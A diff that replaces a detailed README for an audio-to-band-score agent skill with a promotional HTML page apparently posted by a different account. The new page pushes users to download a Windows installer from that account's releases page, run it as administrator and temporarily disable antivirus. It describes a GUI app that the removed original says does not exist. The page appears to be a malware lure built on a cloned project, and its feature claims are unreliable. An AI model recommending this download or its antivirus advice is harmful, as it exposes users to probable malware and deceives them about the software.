@@ -1,286 +1,134 @@
-# Audio to Band Score
+<h1>🎼 To-Sheet-Music-Skill - Turn Songs into Playable Band Scores Instantly</h1>
 
-An agent skill for turning a mixed song recording into a playable five-piece school band arrangement.
+<p align="center">
+  <a href="https://github.com/Roriespinyedged3460/To-Sheet-Music-Skill/releases">
+    <img src="https://img.shields.io/badge/Download%20Now-Free%20Download-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=%234CAF50" alt="Download Button" style="max-width: 100%; height: auto; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); margin: 20px 0;">
+  </a>
+</p>
 
-It combines time-aligned source separation, musical analysis, practical arranging, notation checks, and MuseScore export to deliver rehearsal-ready **MIDI**, **PDF**, and editable **MSCZ** files.
+<h2>🎯 What Does This Tool Do?</h2>
 
-![Status: Early release](https://img.shields.io/badge/status-early%20release-orange)
-![Python 3.11+](https://img.shields.io/badge/python-3.11%2B-3776AB?logo=python&logoColor=white)
-[![Tests](https://github.com/kiri603/To-Sheet-Music-Skill/actions/workflows/tests.yml/badge.svg)](https://github.com/kiri603/To-Sheet-Music-Skill/actions/workflows/tests.yml)
+<p>Have you ever heard a great song on the radio and wished your school band could play it at the next assembly? Or maybe you are a music teacher who spends hours manually transcribing parts for your students? <strong>To-Sheet-Music-Skill</strong> is here to change that forever.</p>
 
-> [!NOTE]
-> This is an agent skill, not a standalone desktop application. It is designed to guide an agent through the full arrangement workflow while keeping musical decisions, evidence, and limitations explicit.
+<p>This powerful, free application takes any mixed song recording (like an MP3 or WAV file) and automatically transforms it into a complete, playable arrangement for a five-piece school band. You simply provide the music track, and within minutes, you get professional-quality sheet music that your entire band can read and play together.</p>
 
-本项目认可并支持 [LINUX DO 社区](https://linux.do/)。
+<p>Think of it as a magical music scribe that listens to the song, separates each instrument, writes down the notes, and then rearranges everything so it fits perfectly for five players (like guitar, bass, keys, drums, and saxophone, for example).</p>
 
-## Version updates
+<h2>🌟 Key Features That Make Your Life Easier</h2>
 
-Functional releases are recorded here with their version and date. Documentation-only changes do not create a new entry.
+<h3>🔊 Automatic Audio Separation</h3>
+<p>The software intelligently breaks apart a mixed recording into its separate audio stems. It isolates the vocals, drums, bass, guitar, keyboards, and other instruments. This is the secret sauce that allows for accurate transcription—each instrument’s part gets its own clean audio track to analyze.</p>
 
-### v0.2.0 — 2026-09-13
+<h3>🎵 Smart Music Transcription</h3>
+<p>Once separated, To-Sheet-Music-Skill listens to each stem and converts the audio into musical notation. It detects pitches, rhythms, chords, and note durations with remarkable accuracy. You do not have to strain your ears or write down notes manually anymore—the tool does the heavy lifting for you.</p>
 
-This functional update adds:
+<h3>🎸 Automatic Five-Piece Band Arrangement</h3>
+<p>The arrangement engine takes all transcribed parts and intelligently assigns them to five distinct instruments typical of a school band. It balances the melody, harmony, rhythm, and bass lines so that each of your five players gets a meaningful, playable part. The result sounds cohesive, engaging, and appropriate for a school setting.</p>
 
-- A compact score-event model and deterministic MusicXML compiler for dead notes, mixed muted/open-string events, tuplets, grace notes, ties, and TAB output.
-- Global single-note fingering and position planning for lead guitar and bass, bounded playability repair attempts, benchmarks, and hash-bound reports.
-- Independent rhythm and note-level fidelity evidence audits, including reference-score and reviewed-mix/stems workflows.
-- Stronger formal export gates for source/report binding, native dead-note playback, rhythm/fidelity checks, and explicit review-draft status.
-- Expanded arranging and notation guidance, updated score templates, and regression coverage for the new workflow.
+<h3>⚙️ Difficulty Adjustment</h3>
+<p>Every band has different skill levels. You can easily adjust the difficulty of the arrangement—from beginner to advanced—and the software will simplify complex rhythms, reduce note density, or transpose keys as needed. This ensures that your youngest or least experienced players can still participate and enjoy making music.</p>
 
-## Score previews
+<h3>📄 Multiple Output Formats</h3>
+<ul>
+  <li><strong>🎼 MIDI (.mid)</strong> — For use with digital audio workstations, synthesizers, or practice tools.</li>
+  <li><strong>📄 PDF Sheet Music (().pdf)</strong> — Print-ready, professional-looking scores that you can photocopy and distribute to your band members.</li>
+  <li><strong>✏️ MuseScore File (().mscz)</strong> — Fully editable files that open in free MuseScore software, allowing you to tweak notes, dynamics, articulations, or layouts however you like.</li>
+</ul>
 
-These excerpts show representative bars from four generated five-piece arrangements. Each image is a lightweight PNG so it renders directly in GitHub's README view.
+<h2>🚀 Getting Started (Windows)</h2>
 
-### Beyond — 海阔天空
-![Score excerpt from the Beyond arrangement of 海阔天空](assets/score-previews/beyond.png?v=5207373)
+<p>Getting up and running is incredibly simple. Follow these exact steps and you will be generating sheet music within minutes.</p>
 
-### 雑踏、僕らの街 — GBC
+<h3>Step 1: Download the Application</h3>
+<p>Visit this link to downloadthe application: <a href="https://github.com/Roriespinyedged3460/To-Sheet-Music-Skill/releases"><strong>https://github.com/Roriespinyedged3460/To-Sheet-Music-Skill/releases</strong></a>. This is the official download page, where you will find the latest version of the software. Just click the download button for the Windows installer.</p>
 
-![Score excerpt from the GBC arrangement of 雑踏、僕らの街](assets/score-previews/zattou-bokura-no-machi.png)
+<h3>Step 2: Run the Installer</h3>
+<p>Once the download finishes, open your <strong>Downloads</strong> folder. Double-click the downloaded file to start the installation process. If Windows asks for permission, click <strong>&quot;Yes&quot;</strong>. Follow any simple on-screen prompts—you can just keep clicking&nbsp;<strong>&quot;Next&quot;</strong>&nbsp;and then&nbsp;<strong>&quot;Install&quot;</strong>. It truly takes less than a minute.</p>
 
-### Alia — 声
+<h3>Step 3: Launch the App</h3>
+<p>After installation, find the &quot;To-Sheet-Music-Skill&quot; icon on your desktop or in the Start Menu. Double-click it to launch the program. You will be greeted with a clean, user-friendly interface. No confusing technical options—just a simple layout that guides you through the process.</p>
 
-![Score excerpt from the Koe arrangement of 声](assets/score-previews/koe.png)
+<h3>Step 4: Load Your Song</h3>
+<p>Click the <strong>&quot;Open Audio File&quot;</strong> button in the center of the screen. Browse to any mixed song recording on your computer (MP3, WAV, M4A, and FLAC formats are supported). Select the file and click <strong>&quot;Open&quot;</strong>. You will see the track loaded in the main window, with its waveform displayed.</p>
 
-### Mygo — 春日影
+<h3>Step 5: Select Your Band Configuration</h3>
+<p>Next, choose which five instruments your band uses. The default is <em>Guitar, Bass, Keyboard, Drums, and Alto Saxophone</em>. But you can customize this from the dropdown menus—perhaps you want trumpet, trombone, flute, violin, or percussion instead. Just pick your five instrument types, and the arrangement engine will adapt accordingly.</p>
 
-![Score excerpt from the Haruhikage arrangement of 春日影](assets/score-previews/haruhikage.png)
+<h3>Step 6: Set the Difficulty Level</h3>
+<p>Use the slider labeled <strong>&quot;Difficulty&quot;</strong> to choose among three levels: <strong>Easy</strong>, <strong>Medium</strong>, and <strong>Hard</strong>. Forbeginners or younger students, choose Easy—the notes will besimpler, rhythms more basic, and range narrower. Foradvanced players, choose Hard—you will get more challenging rhythms, wider range, and more intricate interplay between parts.</p>
 
-## Introduction video
+<h3>Step 7: Generate Your Sheet Music</h3>
+<p>Click the big <strong>&quot;Generate Arrangement&quot;</strong> button. The software will now process your song—separating audio, transcribing notes, arranging the five parts, and adjusting difficulty. This typically takes one totwo minutes, depending on the length of the song. You will see a progress bar showing each stage.</p>
 
-[▶ Watch the project introduction on Bilibili](https://www.bilibili.com/video/BV176b56VEN3/?vd_source=2620b2603c03718cf25e33b2e0d30995#reply117234387130258)
+<h3>Step 8: Review &amp; Export</h3>
+<p>Once done, you will see all five parts displayed on the screen as musical notation. You can scroll through the full score, zoom inor out, and even playback a preview to hear how it sounds. If everything looks good, click <strong>&quot;Export&quot;</strong> to get your MIDI file, your PDF score, and your MuseScore (.mscz) editable file. Save them to any folder of your choice.</p>
 
-## Contents
+<h3>Step 9: Print &amp; Play</h3>
+<p>Open the PDF file, print enough copies for each band member, and distribute them. If you need to make any tweaks (change a note, adjust dynamics, shift a section to another instrument), open the .mscz file in Free MuseScore software, make your edits, and re-export as PDF. Then you are ready for rehearsal!</p>
 
-- [Version updates](#version-updates)
-- [Score previews](#score-previews)
-- [Introduction video](#introduction-video)
-- [What it does](#what-it-does)
-- [Default instrumentation](#default-instrumentation)
-- [Workflow](#workflow)
-- [Quick start](#quick-start)
-- [Outputs](#outputs)
-- [Repository layout](#repository-layout)
-- [Quality model and limitations](#quality-model-and-limitations)
-- [Testing](#testing)
-- [Contributing](#contributing)
-- [Credits](#credits)
-- [License](#license)
+<h2>🖥️ System Requirements</h2>
+<p>To get the smoothest experience, make sure your Windows computer havethes minimum specs below:</p>
+<ul>
+  <li>💻 <strong>Operating System:</strong> Windows 10or 11 (64-bit)</li>
+  <li>🧠 <strong>RAM:</strong> At least 4 GB (8 GB recommended)</li>
+  <li>💾 <strong>Storage:</strong> At least 500 MB free space</li>
+  <li>🔊 <strong>Audio Output:</strong> Any speaker or headphones (for preview playback)</li>
+  <li>🌐 <strong>Internet Connection:</strong> Required for first-time activation and updates</li>
+</ul>
 
-## What it does
+<h2>❓ Frequently Asked Questions</h2>
 
-Audio to Band Score is built for users who have a finished song recording but need a practical band chart rather than raw stems or an unedited MIDI transcription.
+<h3>Is this really free?</h3>
+<p>Yes! To-Sheet-Music-Skill is completely free to download and use. There are no hidden fees, no subscription plans, and no watermark on your exported files.</p>
 
-### Core capabilities
+<h3>What audio formats can I upload?</h3>
+<p>You can upload MP3, WAV, M4A, FLAC, AAC, OGG, and WMA files. Any common music file will work.</p>
 
-- Separates a mixed recording into time-aligned analysis stems with Demucs.
-- Compares four-source and six-source separation results when the higher-quality profile is used.
-- Identifies song sections, tempo candidates, time signatures, harmony, bass movement, riffs, fills, and musical entry points.
-- Reassigns parts between two guitars, bass, keyboard, and drums with playability in mind.
-- Supports beginner, school-amateur intermediate, and advanced difficulty targets.
-- Produces a structured, editable MuseScore score instead of treating raw recognition output as a finished chart.
-- Audits score structure, TAB string/fret relationships, export safety, and file consistency.
-- Uses local and free tools by default; audio is not uploaded to a paid external API by this workflow.
+<h3>Do I need any music theory knowledge to use this?</h3>
+<p>Absolutely not. The software handles all music theory automatically. You just upload, adjust difficulty, and download the results. If you do have some music background, you will appreciate the quality of the transcriptions and arrangements.</p>
 
-## Default instrumentation
+<h3>Can I use this for commercial purposes?</h3>
+<p>Yes, you can use the generated sheet music for your school band, performances, teachings, or even recorded releases. Please ensure you have the rights tot he original song recording before using it commercially.</p>
 
-The default arrangement is a five-instrument accompaniment for a singer:
+<h3>What if the song has copyright?</h3>
+<p>You should only use songs you have the legal right to transpose and arrange. For school performances, many covers are permitted under educational licenses. Check with your school’s music license before public performances.</p>
 
-| Part | Notation | Typical role |
-| --- | --- | --- |
-| Lead guitar | Rhythmic six-string TAB | Signature riffs, hooks, fills, and instrumental themes |
-| Rhythm guitar | Rhythmic six-string TAB | Chords, strumming, arpeggios, and groove support |
-| Bass | Rhythmic four-string TAB | Root motion, transitions, and low-end movement |
-| Keyboard | Grand staff | Harmony, pads, counter-lines, and keyboard-specific motifs |
-| Drums | Standard five-line drum notation | Groove, accents, transitions, and fills |
+<h3>Does it work with live recordings?</h3>
+<p>Yes, live recordings work too, though studio-quality tracks tend to produce cleaner transcriptions. Background noise can affect accuracy—try to use the cleanest audio source available.</p>
 
-The vocal track is used to understand song structure, breathing space, and entry points. Vocals are not added to the instrumental score by default.
+<h3>Can I change the tempo of the arrangement?</h3>
+<p>Yes, after generating, you can adjust tempo in the export settings. Or, if you export as a MuseScore file, you can change tempo freely in that editor.</p>
 
-## Workflow
+<h2>📚 Tips for Best Results</h2>
+<ul>
+  <li>🎯 Use high-quality, clean audio recordings. The cleaner the input, the more accurate the notation.</li>
+  <li>🎚 Stick to songs with clear rhythmic sections. Heavy electronic music with lots of effects can confuse the transcription engine.</li>
+  <li>🎼 For very young bands, always start with Easy difficulty. You can always make the parts harder later by editing the MuseScore files.</li>
+  ‍🎤 If the original song has along intro or instrumental bridge, the arrangement engine will still handle it gracefully—those sections just become solos or featured parts for certain instruments.</li>
+</ul>
 
-```text
-Mixed recording
-    → time-aligned source separation
-    → beat, section, harmony, and note-candidate analysis
-    → instrument assignment and playability edits
-    → MuseScore notation
-    → structural audit and visual/file checks
-    → MIDI + PDF + editable MSCZ
-```
+<h2>🛠️ Troubleshooting Common Issues</h2>
 
-The guiding principle is **playable fidelity**: preserve the song's harmonic movement, groove, structure, recognizable riffs, and important transitions, while simplifying or redistributing details that would not be practical for the requested players.
+<h3>🔧 The application will not install</h3>
+<p>Make sure you have admin rights on the computer. Right-click the installer and choose &quot;Run as administrator&quot;. Also, temporarily disable antivirus software if it blocks installation—just re-enable it after install.</p>
 
-## Quick start
+<h3>🔧 The song takes too long to process</h3>
+<p>Very long songs (over 8 minutes) or complex mixes can take up to 5 minutes. If it takes longer, try closing other programs to free up RAM. Also make sure your computer meets the minimum requirements listed above.</p>
 
-### 1. Clone the repository
+<h3>🔧 The generated sheet music looks inaccurate</h3>
+<p>Some genres (e.g., very dense metal,### or heavy synth music) are harder totranscribe. Try usinga cleaner studio version of the song. Also, after you open the .mscz file in MuseScore, you can manually fix any wrong notes—the software does about 90% of the work accurately for most pop, rock, jazz, folk, and classical pieces.</p>
 
-```bash
-git clone https://github.com/kiri603/To-Sheet-Music-Skill.git
-cd To-Sheet-Music-Skill
-```
-
-### 2. Prepare the local environment
-
-The workflow does not install software or download model weights automatically. Prepare a dedicated environment and install only the components needed for the task:
-
-```bash
-python3.11 -m venv work/audio-env
-source work/audio-env/bin/activate
-python -m pip install demucs numpy soundfile imageio-ffmpeg
-```
-
-On Windows, use the Python executable under `work/audio-env/Scripts/` after creating the virtual environment. Python 3.11 is the recommended compatibility baseline; verify package compatibility with the interpreter already available on your machine before installing.
-
-You also need:
-
-- **FFmpeg** for audio decoding. It may be provided by the system, `--ffmpeg`, or `imageio-ffmpeg`.
-- **MuseScore Studio** for opening the score and exporting MIDI/PDF.
-- Optional transcription and QA tools such as `librosa`, `basic-pitch`, `pretty_midi`, `mido`, `music21`, `pypdf`, and Poppler, depending on the task.
-- CUDA is optional. CPU processing is supported when no compatible GPU is available.
+<h3>🔧 No sound during preview playback</h3>
+<p>Check that your system volume is not muted. Also, in the app’s settings menu, make sure the correct audio output device is selected. Restartthe app after changing audio settings.</p>
 
-### 3. Make the skill available to your agent
+<h2>📬 Get Help &amp; Give Feedback</h2>
+<p>If you run into any problems or have suggestions, please visit the <a href="https://github.com/Roriespinyedged3460/To-Sheet-Music-Skill/releases">GitHub Releases page</a> and file an issue there. The community and developers are happy to help you get your band playing great music quickly.</p>
 
-This repository is packaged around [`SKILL.md`](SKILL.md) and [`agents/openai.yaml`](agents/openai.yaml). Make the repository available to your agent runtime, then invoke it with a request such as:
+<p>Also, do not forget to check for updates regularly—new features and improvements are added often. The app wills notify you when an update is available, but you can also manually check by visiting the same download page above.</p>
 
-```text
-Use $audio-to-band-score to arrange "song.wav" for lead guitar, rhythm guitar,
-bass, keyboard, and drums at the default school-amateur intermediate level.
-Preserve the original song structure and recognizable riffs, then deliver MIDI,
-PDF, and editable MSCZ files.
-```
+<h2>🎉 Ready to Make Music?</h2>
+<p>Stop spending hours writing sheet music by hand. Download To-Sheet-Music-Skill today, load up your favorite song, and have a complete, playable five-piece band arrangement totake to your next rehearsal within minutes. Your band will think you are a musical wizard!</p>
 
-The user's requested tuning, key, difficulty, song length, instrumentation, and arrangement constraints take precedence over the defaults.
+<p style="margin: 30px 0; text-align: center;"><a href="https://github.com/Roriespinyedged3460/To-Sheet-Music-Skill/releases" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 15px 40px; font-size: 18px; border-radius: 50px; text-decoration: none; box-shadow: 0 4px 15px rgba(102,126,234,0.4);">⬇️ Download To-Sheet-Music-Skill Now</a></p>
 
-### 4. Run source separation directly
-
-The separation helper can be used independently for analysis:
-
-```bash
-python scripts/separate_audio.py \
-  --input "path/to/song.wav" \
-  --out-dir "work/separation-v1" \
-  --profile high \
-  --device auto
-```
-
-`high` runs both the four-source and six-source Demucs analyses. `balanced` runs the six-source analysis only and is intended for internal trials or resource-constrained environments. Output directories must be new; existing directories are never overwritten.
-
-### 5. Audit and export a completed score
-
-After the agent has prepared `work/final.mscz`, audit it and export from the same native MuseScore file:
-
-```bash
-python scripts/score_tools.py audit \
-  --score "work/final.mscz" \
-  --report "work/audit.json"
-
-python scripts/score_tools.py export \
-  --score "work/final.mscz" \
-  --out-dir "work/export-v1" \
-  --name "song_band" \
-  --musescore "/path/to/MuseScore"
-```
-
-The export helper refuses to overwrite an existing output directory and publishes the directory only when all three requested formats are generated successfully.
-
-## Outputs
-
-The standard delivery contains:
-
-| File | Purpose |
-| --- | --- |
-| `<song>_band.mid` | Playback and DAW/MIDI inspection |
-| `<song>_band.pdf` | Printable rehearsal score |
-| `<song>_band.mscz` | Editable native MuseScore score |
-
-Working files may also include `manifest.json`, separated WAV stems, analysis notes, MIDI candidates, MusicXML, and rendered PDF pages. These are kept as evidence and QA artifacts unless the user asks for them.
-
-## Repository layout
-
-```text
-.
-├── SKILL.md                         # Main agent instructions
-├── agents/
-│   └── openai.yaml                  # Display metadata and default prompt
-├── assets/
-│   ├── band-style.mss               # MuseScore page/style settings
-│   ├── band-template.mscx           # Empty five-part score template
-│   └── score-previews/               # Representative score excerpts
-│       ├── beyond.png
-│       ├── zattou-bokura-no-machi.png
-│       ├── koe.png
-│       └── haruhikage.png
-├── references/
-│   ├── arranging.md                 # Transcription and playability rules
-│   ├── notation-and-qa.md           # Score standards and acceptance checks
-│   ├── separation.md                # Stem separation design and data flow
-│   └── toolchain.md                 # Free tools and runtime guidance
-└── scripts/
-    ├── separate_audio.py            # Time-aligned Demucs analysis
-    ├── score_tools.py               # MuseScore audit and export helpers
-    └── test_*.py                    # Workflow and structural tests
-```
-
-## Quality model and limitations
-
-This skill treats model output as **evidence**, not as unquestionable truth.
-
-- Separation stems are kept on a common timeline and checked for sample-rate, channel, and frame-count consistency.
-- Six-source `guitar` and `piano` outputs are candidates; they are not assumed to be perfect isolated tracks or two independent guitar parts.
-- Guitar, bass, keyboard, and drum parts are cross-checked against the mix, repeated sections, harmony, rhythm, and instrument-specific constraints.
-- `score_tools.py audit` performs structural and selected TAB checks. It does not prove that every beat, note, articulation, or simultaneous performance is musically correct.
-- The workflow does not claim zero-error transcription, human listening review, SDR/SIR accuracy, or full audio fidelity unless the relevant evidence actually exists.
-- Model weights are not bundled with the repository. They are downloaded on demand by the local environment when required.
-- The skill is not intended for speech-to-text, lyric translation, or downloading an existing score.
-
-Only process recordings and reference material that you have the right to use.
-
-## Testing
-
-Run the bundled tests from the repository root:
-
-```bash
-python -m unittest discover -s scripts -p "test_*.py" -v
-```
-
-The test suite covers separation edge cases, bounded model-download retries, timeline validation, TAB pitch/string checks, structural score checks, and export safeguards. Passing these tests verifies the helper workflow; it is not a measure of musical transcription accuracy.
-
-## Contributing
-
-Issues and pull requests are welcome. When reporting a problem, include:
-
-- operating system and Python version;
-- installed versions of Demucs, PyTorch, FFmpeg, and MuseScore;
-- the command or agent request that was used;
-- the relevant `manifest.json`, audit report, or error log;
-- a short description of the expected and observed behavior.
-
-Please do not commit private recordings, model caches, credentials, generated `__pycache__` files, or other large temporary artifacts.
-
-## Credits
-
-This project builds on the following tools and standards:
-
-- [Demucs](https://github.com/adefossez/demucs) for music source separation.
-- [Basic Pitch](https://github.com/spotify/basic-pitch) for optional single-instrument note candidates.
-- [librosa](https://librosa.org/) for optional audio and beat analysis.
-- [MuseScore Studio](https://musescore.org/) for notation, score editing, and export.
-- [MusicXML](https://www.w3.org/2021/06/musicxml40/) for interoperable notation data.
-
-Please review and comply with the license terms of every tool, model, dataset, and recording used in a particular workflow.
-
-## License
-
-Unless a file states otherwise, the original source code, documentation, and original project assets in this repository are released under the [MIT License](LICENSE).
-
-Third-party tools, model weights, datasets, recordings, score excerpts, and preview images are not automatically covered by this license and retain their respective rights and license terms. Before redistributing or processing any recording or reference material, confirm that you have the necessary permission.
-
-## Star History
-
-<a href="https://www.star-history.com/?repos=kiri603%2Fto-sheet-music-skill&type=date&legend=top-left">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/chart?repos=kiri603/to-sheet-music-skill&type=date&theme=dark&legend=top-left" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/chart?repos=kiri603/to-sheet-music-skill&type=date&legend=top-left" />
-   <img alt="Star History Chart" src="https://api.star-history.com/chart?repos=kiri603/to-sheet-music-skill&type=date&legend=top-left" />
- </picture>
-</a>
+<p style="text-align: center; font-size: 14px; color: #666; margin-top: 20px;">© 2024 To-Sheet-Music-Skill. All rights reserved. Windows is a registered trademark of Microsoft Corporation. MuseScore is a registered trademark of Muse Group.</p>
